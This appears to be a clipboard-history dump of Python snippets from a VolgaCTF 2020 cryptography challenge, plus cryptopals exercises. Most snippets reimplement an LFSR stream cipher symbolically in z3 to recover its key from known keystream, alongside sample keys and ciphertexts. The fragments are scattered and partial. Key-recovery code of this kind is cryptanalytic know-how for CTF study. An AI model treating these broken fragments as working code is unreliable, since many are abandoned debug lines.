	test_keystream2 = [0x48, 0x00, 0xd4, 0x32, 0x8e, 0x16, 0xa1, 0x4d, 0xcd, 0x7b, 0x97, 0x22, 0x26, 0x51, 0x00]
	
	class Cipher:
	    def __init__(self, key: list, frame: int):
	        self.key = key
	        self.sym_key = z3.BitVec("key", 8*8)
	#         self.sym_key = [z3.Int("k{0}".format(i)) for i in range(8)]
	
	        self.frame = frame
	#         self.z3_frame = z3.BitVecVal(frame, 8)
	        
	        self.br = [
	            [13, 16, 17, 18],
	            [20, 21],
	            [7, 20, 21, 22],
	            [11, 16]
	        ]
	        self.majs = [
	            [12, 14, 15],
	            [9, 13, 16],
	            [13, 16, 18]
	        ]
	        self.regs = [
	            [0] * 19,
	            [0] * 22,
	            [0] * 23,
	            [0] * 17
	        ]
	
	        self.z3_regs = [
	            [z3.BitVecVal(0,1)]*19,
	            [z3.BitVecVal(0,1)]*22,
	            [z3.BitVecVal(0,1)]*23,
	            [z3.BitVecVal(0,1)]*17
	        ]
	        self.tick = [3, 7, 10]
	        self.complement = [1, 2, 0]
	
	        for i in range(64):
	            ## Sets registers based on key
	            keybit = (self.key[int(i / 8)] >> (i & 7)) & 1
	#             z3_keybit = (self.sym_key[int(i / 8)] >> (i & 7)) & 1
	            z3_keybit = z3.Extract(
	                0,
	                0,
	                z3.LShR(
	                    z3.Extract(
	                        (int(i / 8)+1)*8-1,
	                        int(i / 8)*8,
	                        self.sym_key
	                    ),
	                    (i & 7)
	                )
	            )
	#             print(z3_keybit)
	            for j in range(4):
	                self.regs[j] = self.clock_r(self.regs[j], self.br[j])
	                self.z3_regs[j] = self.clock_r(self.z3_regs[j], self.br[j])
	                self.regs[j][0] ^= keybit
	                self.z3_regs[j][0] ^= z3_keybit
	                
	
	        for i in range(22):
	            ## Sets registers based on frame
	            framebit = (self.frame >> i) & 1
	            for j in range(4):
	                self.regs[j] = self.clock_r(self.regs[j], self.br[j])
	                self.z3_regs[j] = self.clock_r(self.z3_regs[j], self.br[j])
	                self.regs[j][0] ^= framebit
	                self.z3_regs[j][0] ^= framebit
	
	        self.regs[0][15] = 1
	        self.regs[1][16] = 1
	        self.regs[2][18] = 1
	        self.regs[3][10] = 1
	        self.z3_regs[0][15] = z3.BitVecVal(1,1)
	        self.z3_regs[1][16] = z3.BitVecVal(1,1)
	        self.z3_regs[2][18] = z3.BitVecVal(1,1)
	        self.z3_regs[3][10] = z3.BitVecVal(1,1)
	
	        for i in range(99):
	            maj = self.maj(list(map(self.regs[3].__getitem__, self.tick)))
	            if self.regs[3][10] == maj:
	                self.regs[0] = self.clock_r(self.regs[0], self.br[0])
	                self.z3_regs[0] = self.clock_r(self.z3_regs[0], self.br[0])
	            if self.regs[3][3] == maj:
	                self.regs[1] = self.clock_r(self.regs[1], self.br[1])
	                self.z3_regs[1] = self.clock_r(self.z3_regs[1], self.br[1])
	            if self.regs[3][7] == maj:
	                self.regs[2] = self.clock_r(self.regs[2], self.br[2])
	                self.z3_regs[2] = self.clock_r(self.z3_regs[2], self.br[2])
	            self.regs[3] = self.clock_r(self.regs[3], self.br[3])
	            self.z3_regs[3] = self.clock_r(self.z3_regs[3], self.br[3])
	
	    @staticmethod
	    def maj(nums: list) -> int:
	        if sum(nums) >= 2:
	            return 1
	        return 0
	
	    @staticmethod
	    def clock_r(reg: list, branches: list) -> list:
	        new = 0
	        for i in branches:
	            new ^= reg[i]
	        reg = [new] + reg[:-1]
	
	        return reg
	
	    def next_bit(self) -> int:
	        output = 0
	        z3_output = z3.BitVecVal(0, 1)
	        
	        maj = self.maj(list(map(self.regs[3].__getitem__, self.tick)))
	        if self.regs[3][10] == maj:
	            self.regs[0] = self.clock_r(self.regs[0], self.br[0])
	            self.z3_regs[0] = self.clock_r(self.z3_regs[0], self.br[0])
	        if self.regs[3][3] == maj:
	            self.regs[1] = self.clock_r(self.regs[1], self.br[1])
	            self.z3_regs[1] = self.clock_r(self.z3_regs[1], self.br[1])
	        if self.regs[3][7] == maj:
	            self.regs[2] = self.clock_r(self.regs[2], self.br[2])
	            self.z3_regs[2] = self.clock_r(self.z3_regs[2], self.br[2])
	        self.regs[3] = self.clock_r(self.regs[3], self.br[3])
	        self.z3_regs[3] = self.clock_r(self.z3_regs[3], self.br[3])
	        
	        for i in range(3):
	            bits = list(map(self.regs[i].__getitem__, self.majs[i]))
	            bits[self.complement[i]] ^= 1
	            output ^= self.maj(bits)
	            z3_output ^= self.maj(bits)
	            
	        output = output ^ self.regs[0][-1] ^ self.regs[1][-1] ^ self.regs[2][-1]
	        z3_output = z3_output ^ self.z3_regs[0][-1] ^ self.z3_regs[1][-1] ^ self.z3_regs[2][-1]
	#         print(z3.simplify(z3_output))
	
	        return output, z3.simplify(z3_output)
	
	msg = "A"*100
	inpt = base64.b64encode(msg.encode())
	message: bytes = base64.b64decode(inpt.strip())
	n_blocks = int(len(message) / 15) + 1
	ciphertext = b''
	
	s = z3.Solver()
	key = [0,0,0,0,0,0,0,0]
	for frame in range(n_blocks):
	    p_block = message[frame*15:(frame+1)*15]
	    # print(p_block)
	    p_block = int.from_bytes(p_block, byteorder='big')
	#     p_z3_block = z3.BitVecVal(p_block, 15*8)
	    # print("key:", key)
	    cipher = Cipher(key, frame)
	    k_block = 0
	    for b in range(114):
	        bit, z3_bit = cipher.next_bit()
	        # print(bit==z3_bit)
	        s.add(bit==z3_bit)
	#         print(bit)
	        k_block = (k_block << 1) + bit
	#     k_z3_block = z3.BitVecVal(k_block, 15*8)
	    # print(k_block)
	    k_block = k_block << 6
	    c_block = p_block ^ k_block
	    ciphertext += int.to_bytes(c_block, length=15, byteorder='big')
	
	
	print(s.check())
	print(s.model())
	ciphertext = base64.b64encode(ciphertext)
	# send_message(ciphertext)
77a464c204bbbba7f06d0761e66c053b|file:///home/neo/CTFs/volga2020/export/z3-export.py|2|1|V|python
	!pip install z3-solver
6c6496000de0b4b75c37e2efd177cc63|file:///home/neo/CTFs/volga2020/export/newcipher.py|77|1|V|python
	    key = [0x00, 0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
	    iv = 0x21
	    test_keystream1 = [0xf4, 0x51, 0x2c, 0xac, 0x13, 0x59, 0x37, 0x64, 0x46, 0x0b, 0x72, 0x2d, 0xad, 0xd5, 0x00]
	    test_keystream2 = [0x48, 0x00, 0xd4, 0x32, 0x8e, 0x16, 0xa1, 0x4d, 0xcd, 0x7b, 0x97, 0x22, 0x26, 0x51, 0x00]
	
	    cipher = Cipher(key, iv)
	
	    output = [0] * 15
	    for i in range(114):
	        output[int(i / 8)] |= cipher.next_bit() << (7 - (i & 7))
	    if output == test_keystream1:
	        print('Test#1: OK')
	        
	    output = [0] * 15
	    for i in range(114):
	        output[int(i / 8)] |= cipher.next_bit() << (7 - (i & 7))
	    if output == test_keystream2:
	        print('Test#2: OK')
8c8937e1845df61e38e318aa0a10d131|file:///home/neo/CTFs/volga2020/export/z3-export.py|157|1|V|python
	if output == test_keystream1:
	    print('Test#1: OK')
6d46631d2667f73ba7acd1a3be0a4dd6|file:///home/neo/CTFs/volga2020/export/z3-export.py|161|4|V|python
	if output == test_keystream2:
	    print('Test#2: OK')
b0512995d2a7ebc00da27b948b521305|file:///home/neo/CTFs/volga2020/export/z3-export.py|157|27|v|python
	cipher.next_bit() 
bcbe8d6af62e61bed612ce66350f33fb|file:///home/neo/CTFs/volga2020/export/z3-export.py|156|1|V|python
	    bit, z3_bit = cipher.next_bit()
dabe26158dc65e15ccf6edc141c70c6c|file:///home/neo/CTFs/volga2020/export/z3-export.py|158|1|V|python
	    output[int(i / 8)] |= bit << (7 - (i & 7))
ab0b3d9235110045c3f6f1773ab6cfca|file:///home/neo/CTFs/volga2020/export/z3-export.py|154|1|V|python
	output, z3_output = [0] * 15
	for i in range(114):
	    bit, z3_bit = cipher.next_bit()
	    s.add(bit==z3_bit)
	    output[int(i / 8)] |= bit << (7 - (i & 7))
	    z3_output[int(i / 8)] |= z3_bit << (7 - (i & 7))
	    s.add(test_keystream1==z3_output)
400b00253fc4082ef6138a7fe2fbf1bf|file:///home/neo/CTFs/volga2020/export/z3-export.py|164|1|V|python
	output = [0] * 15
	for i in range(114):
	    bit, z3_bit = cipher.next_bit()
	    output[int(i / 8)] |= bit << (7 - (i & 7))
	# if output == test_keystream2:
	#     print('Test#2: OK')
dc28324e225878a932953594cb0c60bf|file:///home/neo/CTFs/volga2020/export/z3-export.py|155|1|V|python
	output = [0] * 15
f6cb034ebd83e1781dbcf2cf947bf51a|file:///home/neo/CTFs/volga2020/export/z3-export.py|154|1|V|python
	# output, z3_output = [0] * 15
42fddaf51fa8f49ba2fe005328cfe589|file:///home/neo/CTFs/volga2020/export/z3-export.py|155|1|V|python
	z3_output = [z3.BitVecVal(0,8)] * 15
a80b45f7141d66e4e3eccb48c65e2356|file:///home/neo/CTFs/volga2020/export/z3-export.py|159|1|V|python
	    # z3_output[int(i / 8)] |= z3_bit << (7 - (i & 7))
	    # s.add(test_keystream1==z3_output)
	# if output == test_keystream1:
	#     print('Test#1: OK')
0d295b4dabab5e1d2f1c34b85c3db171|file:///home/neo/CTFs/volga2020/export/z3-export.py|166|1|V|python
	    # z3_output[int(i / 8)] |= z3_bit << (7 - (i & 7))
	    # s.add(test_keystream2==z3_output)
58639b7e5659ea19192dbc4903d86849|file:///home/neo/CTFs/volga2020/export/z3-export.py|158|1|V|python
	#     bit, z3_bit = cipher.next_bit()
94e8f614c76bb3da8464d43462723716|file:///home/neo/CTFs/volga2020/export/z3-export.py|165|1|V|python
	#     bit, z3_bit = cipher.next_bit()
	#     s.add(bit==z3_bit)
c95fff3c23fc2de24f6d9ec7372f27b5|file:///home/neo/CTFs/volga2020/export/z3-export.py|145|1|V|python
	print("key:", key)
7c318458e6c56073b69d93603a448d3b|file:///home/neo/CTFs/volga2020/export/z3-export.py|153|1|V|python
	print(len(test_keystream))
9bebfb17985dea847ec33f82a5b6d32a|file:///home/neo/CTFs/volga2020/export/z3-export.py|158|9|v|python
	print(pos)
c7464850d1cc9b5c9c32d4c3e9519396|file:///home/neo/CTFs/volga2020/export/z3-export.py|158|41|v|python
	.zfill(8)
1486b0392c4a5dcc76072cfdb77b433b|file:///home/neo/CTFs/volga2020/export/z3-export.py|159|20|v|python
	int(str(pos),16))[2:].rjust(8,'0')
9069b947843d8c63a63326f6e2be226d|file:///home/neo/CTFs/volga2020/export/z3-export.py|158|9|V|python
	        print(hex(pos))
5e688ad24e17ad32b3ec531d9174ff59|file:///home/neo/CTFs/volga2020/export/z3-export.py|159|9|V|python
	        print(bits)
06d8b989d9845f674787dff55864abb9|file:///home/neo/CTFs/volga2020/export/z3-export.py|161|13|V|python
	    z3_bit = cipher.next_bit()
	    s.add(bit==z3_bit)
286c881402472a51d4ef2ddf007270db|file:///home/neo/CTFs/volga2020/export/z3-export.py|160|13|V|python
	            print(bit)
d8b8cb6a5707d6bf1823b2fa5d7f7be9|file:///home/neo/CTFs/volga2020/export/z3-export.py|161|13|V|python
	            print(z3_bit)
8b29300855f7fef498868811dd8edc34|file:///home/neo/CTFs/volga2020/export/z3-export.py|148|1|V|python
	iv = 0x21
ecb85f10f0957d9b3c535603b8dad3c0|file:///home/neo/CTFs/volga2020/export/z3-export.py|144|1|V|python
	# key = [0,0,0,0,0,0,0,1]
6bef1f80e3394cadfa981bf44d8695ae|file:///home/neo/CTFs/volga2020/export/server.py|35|38|v|python
	YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ=="
bcf9a8b89bcfc07c6324874b25a1d5eb|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|1|V|python
	ciphertext = 'wET+s8vFeJe4PkvANHoh9vovmjmllTacg/P7hwThDOhOWryQV3/gTV/8eKkhVLsLuAAkc1YqGVMo5OXhoi4DW9GjcqKpUzrMZj4hLzwbVYDUmdBB6bKJpDxh'
ee3bc56e0d21d9676dbf112c4c52ec57|file:///home/neo/CTFs/volga2020/export/decrypt.py|8|26|v|python
	YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ==
30dde8774a630731a6334c46636b0153|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|1|V|python
	ciphertext = 's5jIUG2zw4J6+r63lizh'
c447fad5d0b59257dcf77406e3304f6d|file:///home/neo/CTFs/volga2020/export/z3-export.py|156|1|V|python
	cipher = Cipher(key, iv)
e8d9a2f7ca30f24a1985c0f071d8e5e6|file:///home/neo/CTFs/volga2020/export/z3-export.py|159|5|V|python
	    iv += 1
641f28a60a2d9fd9474cb7fd8e5dc5f7|file:///home/neo/CTFs/volga2020/export/z3-export.py|158|5|V|python
	    print(i)
5a55f109123baa27a5d0918950d2cd98|file:///home/neo/CTFs/volga2020/export/z3-export.py|163|9|V|python
	        bits = str(bin(int(pos,16))[2:].zfill(8))
441d8f2e249fdac129eaf6220958eb9a|file:///home/neo/CTFs/volga2020/export/z3-export.py|163|9|V|python
	        for bit in bits:
8bcbc488159f025ba6f4b3d99b027fc4|file:///home/neo/CTFs/volga2020/export/decrypt.py|27|52|v|python
	.rjust(114,'0')
e9d7ea23fd9ff9be9918e3109f537684|file:///home/neo/CTFs/volga2020/export/decrypt.py|28|68|v|python
	rjust(15*7, '0')))
efd9584a3d679b08cb3cc3b16a902ded|file:///home/neo/CTFs/volga2020/export/z3-export.py|174|1|V|python
	# # output, z3_output = [0] * 15
b347b290720906c62237e994cc938fe6|file:///home/neo/CTFs/volga2020/export/z3-export.py|167|1|V|python
	# cipher = Cipher(key, iv)
b868789703a8d256afba334d33828d5c|file:///home/neo/CTFs/volga2020/export/z3-export.py|180|1|V|python
	
	# for frame in range(n_blocks):
	#     p_block = message[frame*15:(frame+1)*15]
	#     print(p_block)
	#     p_block = int.from_bytes(p_block, byteorder='big')
	    
	#     cipher = Cipher(key, frame)
	#     k_block = 0
	#     for b in range(114):
	#         bit, z3_bit = cipher.next_bit()
	#         s.add(bit==z3_bit)
	#         k_block = (k_block << 1) + bit
	#     k_block = k_block << 6
	#     c_block = p_block ^ k_block
	#     ciphertext += int.to_bytes(c_block, length=15, byteorder='big')
	
	# ciphertext = base64.b64encode(ciphertext)
	# send_message(ciphertext)
0eae8450ae9f53d0fa8ac5a97df5fc37|file:///home/neo/CTFs/volga2020/export/z3-export.py|174|1|V|python
	output = [0] * 15
	for i in range(114):
	    bit, z3_bit = cipher.next_bit()
	    s.add(bit==z3_bit)
	    output[int(i / 8)] |= bit << (7 - (i & 7))
7a4ea1ebea984bafa46be8eb5c725d25|file:///home/neo/CTFs/volga2020/export/z3-export.py|174|1|V|python
	output = [0] * 15
	for i in range(114):
	    bit, z3_bit = cipher.next_bit()
	    s.add(bit==z3_bit)
	    output[int(i / 8)] |= bit << (7 - (i & 7))
	output = [0] * 15
	for i in range(114):
	    bit, z3_bit = cipher.next_bit()
	    s.add(bit==z3_bit)
	    output[int(i / 8)] |= bit << (7 - (i & 7))
3883985bb2e058a0ed0ebd4ee212036b|file:///home/neo/CTFs/volga2020/export/z3-export.py|172|1|V|python
	    # output[int(i / 8)] |= bit << (7 - (i & 7))
bb914698a8cf4f9f98c1328befb246e7|file:///home/neo/CTFs/volga2020/export/z3-export.py|154|1|V|python
	test_keystream[0] = '101100111001100011001000010100000110110110110011101000101110001100011011100110111101111111010110111101110100110110'
aa6b64d40c2e3ac31dcdaa3f07ae32fc|file:///home/neo/CTFs/volga2020/export/z3-export.py|155|22|v|python
	101100111001100011001000010100000110110110110011101000101110001100011011100110111101111111010110111101110100110110
7a500ffa46b00de365300e9d21a37982|file:///home/neo/CTFs/volga2020/export/z3-export.py|163|9|V|python
	        print(bit)
fe1c91cf8afc2dcb462931cb0c9ab7a7|file:///home/neo/CTFs/volga2020/export/z3-export.py|151|1|V|python
	# test_keystream[0] = [0xf4, 0x51, 0x2c, 0xac, 0x13, 0x59, 0x37, 0x64, 0x46, 0x0b, 0x72, 0x2d, 0xad, 0xd5, 0x00]
	# test_keystream[1] = [0x48, 0x00, 0xd4, 0x32, 0x8e, 0x16, 0xa1, 0x4d, 0xcd, 0x7b, 0x97, 0x22, 0x26, 0x51, 0x00]
	# test_keystream[0] = ['0xb3', '0x98', '0xc8', '0x50', '0x6d', '0xb3', '0xa2', '0xe3', '0x1b', '0x9b', '0xdf', '0xd6', '0xf7', '0x4d', '0x2']
970196be7cd167d4076d8a424cce4c57|file:///home/neo/CTFs/volga2020/export/z3-export.py|153|1|V|python
	# test_keystream[1] = ['0x67', '0xad', '0xc', '0xa7', '0xf1', '0x7c', '0x48', '0x9c', '0xe', '0x36', '0xe3', '0xa6', '0x34', '0x7a', '0x3']
34ecf807024a454c9bd086b9f2060baf|file:///home/neo/CTFs/volga2020/export/decrypt.py|8|1|V|python
	plaintext = "YWFhYWFhYWFhYWFhYWFhYQ=="
bc897a5961e1a4ec131163687a9dd666|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|1|V|python
	ciphertext = '0vmpMQzSw4J6+r63lizhZ60Mp/F8SJwONuOmNHqh'
e58c4f730aba5c7466d73e29f2b68ce2|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|1|V|python
	# ciphertext = '0vmpMQzSw4J6+r63lizhBsxtxpAdKf1vV4LHVRuhe9qKiK74GmecL6hfQ/ghFRNJgiICklnbUNQdAhYhtNj/Dnb6O5OdX12cvcBhEXC9g6Eh0gLv5m2y4rXh' 
4ed50685688a39b1608a0485219ff927|file:///home/neo/CTFs/volga2020/export/z3-export.py|156|4|V|python
	    cipher = Cipher(key, i)
fd9710422a154dea738a3fe985cb045a|file:///home/neo/CTFs/volga2020/export/z3-export.py|144|1|V|python
	key = [0,0,0,0,0,1,0,1]
	iv = 0
	# key = [0x00, 0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
	# iv = 0x21
	print("key:", key)
12a2cf332cd167e25ba3c5a7675a0669|file:///home/neo/CTFs/volga2020/export/z3-export.py|149|1|V|python
	test_keystream = {}
4870c7290f5f284c3892f2bf5afbdde6|file:///home/neo/CTFs/volga2020/export/z3-export.py|149|5|v|python
	print(i, line)
b89c9b6a26811549494e3425caaabe6c|file:///home/neo/CTFs/volga2020/export/z3-export.py|152|24|V|python
	for i in test_keystream:
	    print(test_keystream[i])
8c64873d9097661582b8d15d20704a22|file:///home/neo/CTFs/volga2020/export/z3-export.py|154|1|V|python
	# for i in range(len(test_keystream)):
	#     print(test_keystream[i])
	#     bit_list = test_keystream[i]
	#     for bit in bit_list:
	#         test_bit, z3_bit = cipher.next_bit()
	#         s.add(bit==z3_bit)
da8a7de809097b9270294293eb66281d|file:///home/neo/CTFs/volga2020/export/z3-export.py|153|1|V|python
	cipher = Cipher(key, 21)
2d0dc9c7a7be20897516ef94ccd0d042|file:///home/neo/CTFs/volga2020/export/z3-export.py|162|1|V|python
	# key = [0,1,0,1,0,0,0,1]
df7a6cc933b167513f33726fc23cf017|file:///home/neo/CTFs/volga2020/export/z3-export.py|150|1|V|python
	# test_keystream[0] = '101100111001100011001000010100000110110110110011101000101110001100011011100110111101111111010110111101110100110110'
	# test_keystream[1] = '011001111010110100001100101001111111000101111100010010001001110000001110001101101110001110100110001101000111101011'
af6f2685c1384dd219e1a477548c3ca7|file:///home/neo/CTFs/volga2020/export/z3-export.py|87|1|V|python
	            if self.z3_regs[3][10] == maj:
b9dbc6476f4a2fd988376a625a9ceed8|file:///home/neo/CTFs/volga2020/export/z3-export.py|165|24|V|python
	# # key = [0x00, 0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
	# # iv = 0x21
376e2a9afe2ccaed094119ef6a26cd15|file:///home/neo/CTFs/volga2020/export/z3-export.py|157|1|V|python
	# key = [0,0,0,0,0,0,0,0]
	# for i in test_keystream:
	#     cipher = Cipher(key, i)
	#     print(test_keystream[i])
	#     bit_list = test_keystream[i]
	#     for bit in bit_list:
	#         test_bit, z3_bit = cipher.next_bit()
	#         s.add(bit==z3_bit)
311f98d947a6cbc77a5733c92afd392d|file:///home/neo/CTFs/volga2020/export/z3-export.py|87|18|v|python
	self.z3_regs[3][10] == maj
bba408c163cbbc20cebea77a60b15840|file:///home/neo/CTFs/volga2020/export/z3-export.py|89|17|v|python
	self.z3_regs[0] = self.clock_r(self.z3_regs[0], self.br[0])
5339e945977a3be998685f7dc4887e01|file:///home/neo/CTFs/volga2020/export/z3-export.py|89|41|v|python
	self.clock_r(self.z3_regs[0], self.br[0])
d5803d8d449c1a2ed3f7c7afcfd7ca5d|file:///home/neo/CTFs/volga2020/export/z3-export.py|89|21|V|python
	                    # self.z3_regs[0] = self.clock_r(self.z3_regs[0], self.br[0])
3898a032420b54fe8e0591dedcff0838|file:///home/neo/CTFs/volga2020/export/z3-export.py|87|1|V|python
	            if self.z3_regs[3][10] == maj:
	                print("test1")
	            else:
	                print("test2")
02c67200c61f2db170e4beb7e370f0a6|file:///home/neo/CTFs/volga2020/export/z3-export.py|85|16|v|python
	self.regs[3][10] == maj
64bc287e95295dbf40a7d8683e78731e|file:///home/neo/CTFs/volga2020/export/z3-export.py|87|13|V|python
	            print(self.regs[3][10] == maj)
72890bf77372816690f3ccd54b525139|file:///home/neo/cryptopals/set1/set1_sol.py|163|38|v|python
	.decode('latin-1')
b701481afa2e92827447054a5beaf52c|file:///home/neo/cryptopals/set1/set1_sol.py|185|13|V|python
	        else:
	            print("false")
b33752d4dab722a3d03e2341f195a3bc|file:///home/neo/cryptopals/set1/set1_sol.py|172|9|V|python
	        print(ciphertext[i:i+32])
4b3a6218bb3e3a7303e8a171a60fcf92|file:///home/neo/cryptopals/set1/set1_sol.py|166|18|v|python
	bytes
8e45e7b1464d453471648178325209d9|file:///home/neo/cryptopals/set2/set2_sol.py|25|9|V|python
	        plain_block = xor_hex(dec_block_bytes.hex(), prev_block_bytes.hex())
73f0a4cebb63ce75265df5f10374951f|file:///home/neo/cryptopals/set2/set2_sol.py|24|9|V|python
	        print(len(prev_cipher_block))
827784824ca27e6d5f52dd8102d90a1a|file:///home/neo/cryptopals/set2/set2_sol.py|21|9|V|python
	        prev_block_bytes = bytearray(prev_cipher_block, 'utf-8')
b8a2d56b41cd13c4eabc355d292b3328|file:///home/neo/cryptopals/set2/set2_sol.py|15|1|v|python
	encrypt_aes_cbc
3488be2a67c53ee5d15610997dc4ef5a|file:///home/neo/CTFs/volga2020/export/z3-export.py|159|1|V|python
	key = [0,0,0,0,0,0,0,0]
	for i in test_keystream:
	    cipher = Cipher(key, i)
	    print(test_keystream[i])
	    bit_list = test_keystream[i]
	    for bit in bit_list:
	        test_bit, z3_bit = cipher.next_bit()
	        s.add(bit==z3_bit)
8f00574eef344f28ddcd0a85440e6b58|file:///home/neo/CTFs/volga2020/export/z3-export.py|120|1|V|python
	        if self.regs[3][10] == maj:
	            self.regs[0] = self.clock_r(self.regs[0], self.br[0])
0ff3680dc63f496e0dcdf00e119983d8|file:///home/neo/CTFs/volga2020/export/z3-export.py|94|1|V|python
	                self.z3_regs[1] = self.clock_r(self.z3_regs[1], self.br[1])
03bf374f174a30658d88286155378efd|file:///home/neo/CTFs/volga2020/export/z3-export.py|93|1|V|python
	            # if self.z3_regs[3][3] == maj:
	                self.z3_regs[1] = self.clock_r(self.z3_regs[1], self.br[1])
8b96296b28b991b9edd2817b61f68116|file:///home/neo/CTFs/volga2020/export/server.py|35|25|v|python
	"YWFhYWFhYWFhYWFhYWFhYQ=="
0c9d994329f390d7687d22d73f9f59c6|file:///home/neo/CTFs/volga2020/export/server.py|36|13|V|python
	            plaintext = "YWFhYWFhYWFhYWFhYWFhYQ=="
c088244be2458630428aee4e50cd55ad|file:///home/neo/CTFs/volga2020/export/server.py|35|25|v|python
	
93cfb6c9a345e73a30c75a1534b37833|file:///home/neo/CTFs/volga2020/export/server.py|35|1|V|python
	            plaintext
df67addcaadaf079afc42e4c4c16a0c1|file:///home/neo/CTFs/volga2020/export/decrypt.py|7|1|V|python
	# plaintext
00f8b71c6e429c0b78e9ebbfe8a1ddde|file:///home/neo/CTFs/volga2020/export/decrypt.py|8|1|V|python
	ciphertext = '8tmJESzy46Ja2p6XtgzBJuxN5rA9Cd1Pd6LndTuBW/qqqI7YOke8D4h/Y9gBNTNpogIisnn7cPQ9IjYBlPjfLlbaG7O9f328neBBUDH8wuBgk0Oupyzzo/TBsHNadUEC3p1qVIg9tpcB5SUOvCQd746FJjTFL1MBvY7ZH2WDhq4wNpQohNqBpdmykDuy4vJpNUL5K9OBPd59WF2rUy9uzTysNRwBWiKvJxEVtyLWbI4gNX3B+CbgNYI2/RuJw/q3z7eBjKjNEpOog8rUpNLVhOhBZcDjY0E+jmE5Idju1igBWMiq8PW10cUmkOrLbPpB9drX/x/B+NqFMVldSKtBy55B3jIR8DgFLk87CdyBMNfq6nLxxCngAOHrdPZByHZtG5P9Lc/Vqp9S4jvBiiItfp9mQNNrbcBtdyqBDOyUEtpYKK7gGmhbkR1BzTbII08AdPuZymm7n40B3I4HjTwcOueLA+eVGNgB5AYXeo3jdpqu0PhL7x8BRJrPrW7u1TGgk7yKJmoBOVqIeHlVckBaDn2lG74BoNm4yiCzEDDiTzq9G75BDFbrW3l6UVIXYsK40p7BVZKuFKPQOYeohhlF7K2BAMUhUxmYnJG2MN1vL0yBOS5A6jFgD3rjFWifg8ZB70IHz6ZFdR9bJBH/3RfBGU7J6vhR0N2k0TVnxz3K'
ba20f602c0eec1f42223d40e58d9f6ee|file:///home/neo/CTFs/volga2020/export/decrypt.py|6|1|V|python
	plaintext
14a7f7332fb3cc38527c09ea28aef9ab|file:///home/neo/CTFs/volga2020/export/decrypt.py|8|1|V|python
	# ciphertext = '7X/ZqPEZ2w5Yn5lc8KTBm6GSv7dSP1dRNgg4v2zBFNSQd42zRBgWKhE8LMbBkW30DtSnqRet2JIrpI8BL3OcYzxpcF3Uldk41dtBUqRPgJRSEnOynFE/nCoBZxheSTbMMSmh6qP07mOBorkDb6qEO6JMPb1npX/B8tpAmOoOr0M2nmY1QMJB+Ac4cY7qy9YSyIfxVCyB+OJBLmZJoF7i6dnb9eOBNE+qpUe0SNRCM6F6REGBnxLMGFYE+MfGhCJSebGBKyVqSug8OLm8I72F4TdBPYZ9Ok4iTtIxtSLbsz3BydftK9GO9B0rkvzwj3GBZLWdd2FZVPOisCi3sc0BJp2G9HipGH8hZ5N+dM8BQ4ml25Z/sqg6xLOj3hSBWFRjwiNN0EtbfwRjDivBOpR63Vul3mwc8ARGFh9B8MxmJcxWuWycB9XdKmLBrUkaoGIYccKd0S90wldBMAlF++k+7kEHf5LTzo+BLEM+5lzDJO44aa8I6YrBvWgOpGWJxZjptg6o1cNBEFa6Req6vNYq9KNd07ZBvPP0brvTNUeJcaVeliFBWMQeM1lF/4dUOQWX0WGBaE69ji2b+aiDiH2SIvLBvu6JzSlh2X+gJ6kA7xIBUdu8CPGEsEsMJqKink6BsjlwHB/djAlew1gB1efBktCrZdpDoEfu/1dwvIDK'
bae937dd27c9cde8e628adea8cfbf8c6|file:///home/neo/CTFs/volga2020/export/server.py|38|1|V|python
	            key = [101, 102, 103, 104, 105, 106, 107, 108]
4c228c2ce436989d7ef851636e8827f6|file:///home/neo/CTFs/volga2020/export/z3-export.py|161|1|V|python
	key = [0,0,0,0,0,0,0,1]
e7bfe82ff4dd106cc01b6c8381cc4054|file:///home/neo/CTFs/volga2020/export/server.py|36|1|V|python
	neo@neo:~/CTFs/volga2020/export$ python -c "print('A' * 10000)" | base64 
e15453e93a02f0481ed176b4c33d8e3b|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|1|V|python
	ciphertext = 'NMhsqELbyv1jgQv+Y5+BoGOCXboarJjGdUNX7kfBD+qbQpc7OXi5xn6qfa8BiUSaStBftHw+VsAoMWsB51FLwd6scdRMiOFS3PyB65uN/BZgjWWwPq+JlvvBaQ8osOYnR318qeFhqqgBu6aVZiRGM+LxzjPKspBBhKUZz1lbelxMfDGrFq6B+Zzzfn3WWtH/F3YdkB5BiXRaTlubEg2ra3Wzo3uBlOfyDulfWIPBiU4qvNlBs52rnaRYYCBSCq/TyL4B0LrViG0PXnE1p7Rzz3TBMVUXyH3s9XlV0spl8RHBGNQMDY8V1k+5TknbGKbBLm/zOZifOavTKbqOvFRBLfbZ7dpaqQHKvaqX6aQBWMew88NnrD4lgb9fsfCBmiHSnd+1bxcvEvRty4qBa/oXeNx4Pmn7yAINPcGBXcAu9mLNihgs0QmPpw8BlTU3QpvkK9GZIWul/mJBLbOaX0J0Th6+0m/d74oB8Gj9yaIkWteWats3kB6B9xfwS2myW4WPXeozjNzBClZ6cYWpQjYs9kiXGCmBrt+A3FfK670XieQmxPUBdi3xfnF/jF0y4s2ZWQNBoDv2eGs8kyJOz3nWahuB51UOAramBLdgxfhnZEvBrSUkre5L1TIX+uB3RGRBbKrPAJuvmraEhXEMJgLBPPk1jE6Fev2TLSGl/A4K'
8821cb72f14c446e5e7bee3a597bd4be|file:///home/neo/CTFs/volga2020/export/z3-export.py|88|1|V|python
	            self.z3_regs[0] = z3.If(self.z3_regs[3][10] == maj,
	                    self.z3_regs[0] == self.clock_r(self.z3_regs[0], self.br[0]),
	                    self.z3_regs[0] == self.z3_regs[0]
	                    )
da36df96e7e0da1fffd6c1dbf9a00b39|file:///home/neo/CTFs/volga2020/export/z3-export.py|88|12|V|python
	                self.z3_regs[0] = self.clock_r(self.z3_regs[0], self.br[0])
969b819ba57a67dd5ce6898bca73f012|file:///home/neo/CTFs/volga2020/export/z3-export.py|161|1|V|python
	key = [101, 102, 103, 104, 105, 106, 107, 108]
